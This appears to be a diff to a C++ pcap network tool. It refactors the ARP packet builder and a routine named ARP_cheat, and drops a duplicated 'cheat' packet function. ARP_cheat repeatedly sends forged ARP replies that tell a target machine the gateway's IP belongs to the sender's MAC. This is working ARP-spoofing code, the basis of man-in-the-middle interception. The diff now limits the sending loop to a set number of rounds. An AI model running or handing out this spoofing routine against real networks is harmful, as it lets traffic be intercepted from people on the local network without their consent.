@@ -1,31 +1,16 @@
 #include "Headers.h"
 
-void ARP_MakePackage(char * pData,u_int opcode,MAC srcMAC,MAC dstMAC,unsigned long srcIP,unsigned long dstIP){
-	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
-	MAC_MakePackage(pData,srcMAC,dstMAC,MAC_PROTOCOL_TYPE_ARP);	
-	ARPHeader * pARPHeader=(ARPHeader *)(pData+sizeof(MACHeader));
+void ARP_MakePackage(Package & pack,u_int opcode,MAC srcMAC,MAC dstMAC,unsigned long srcIP,unsigned long dstIP){
+	pack.create(sizeof(MACHeader)+sizeof(ARPHeader));
+	MAC_MakePackage(pack,srcMAC,dstMAC,MAC_PROTOCOL_TYPE_ARP);	
+	u_char * arp_data=pack.addSection(sizeof(ARPHeader));
+	ARPHeader * pARPHeader=(ARPHeader *)arp_data;
 	pARPHeader->hardware_type=0x0100;
 	pARPHeader->protocol_type=0x0008;
 	pARPHeader->hardware_size=6;
 	pARPHeader->protocol_size=4;
 	pARPHeader->opcode=opcode;
 	pARPHeader->MAC_sender=srcMAC;
-
-	pARPHeader->IP_sender=srcIP;
-	pARPHeader->MAC_target=dstMAC;
-	pARPHeader->IP_target=dstIP;
-}
-void ARP_MakeCheatPackage(char * pData,u_int opcode,MAC srcMAC,MAC dstMAC,unsigned long srcIP,unsigned long dstIP){
-	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
-	MAC_MakePackage(pData,srcMAC,dstMAC,MAC_PROTOCOL_TYPE_ARP);	
-	ARPHeader * pARPHeader=(ARPHeader *)(pData+sizeof(MACHeader));
-	pARPHeader->hardware_type=0x0100;
-	pARPHeader->protocol_type=0x0008;
-	pARPHeader->hardware_size=6;
-	pARPHeader->protocol_size=4;
-	pARPHeader->opcode=opcode;
-	pARPHeader->MAC_sender=srcMAC;
-
 	pARPHeader->IP_sender=srcIP;
 	pARPHeader->MAC_target=dstMAC;
 	pARPHeader->IP_target=dstIP;
@@ -81,11 +66,9 @@ char * package_Receive(pcap_t * fp,pcap_pkthdr &header){
 	//if(res!=NULL)package_print(res,header.len);
 	return res;
 }
-void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC,MAC targetMAC,MAC gateMAC){
+void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC,MAC targetMAC,MAC gateMAC,int times){
 	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
-	char * pData=new char[package_size];
-
-
+	Package pack(SIZE_PACK_ARP);
 	char *filter=new char[100];
 	strcpy(filter,"ether src ");
 	char tmp_mac[20];
@@ -95,12 +78,11 @@ void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC
 	MAC_toString(myMAC,tmp_mac);
 	filter=strcat(filter,tmp_mac);
 	SetFilter(fp,filter);
-
-	ARP_MakePackage(pData,ARP_OP_REPLY,myMAC,targetMAC,gateIP,getIP("0.0.0.0"));
+	ARP_MakePackage(pack,ARP_OP_REPLY,myMAC,targetMAC,gateIP,getIP("0.0.0.0"));
 	int timer=0;
 	char *recvData;
 	pcap_pkthdr tmp_header;
-	while(1){
+	while(times--){
 		timer=(timer+1)&0x0f;
 		if(timer==0){
 			recvData=package_Receive(fp,tmp_header);
@@ -109,9 +91,7 @@ void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC
 				recvData=package_Receive(fp,tmp_header);
 			}
 		}else{
-			send_raw_package(fp,(u_char *)pData,package_size,1);
+			send_raw_package(fp,(u_char*)pack.data,pack.length,1);
 		}
-
-
 	}
 }
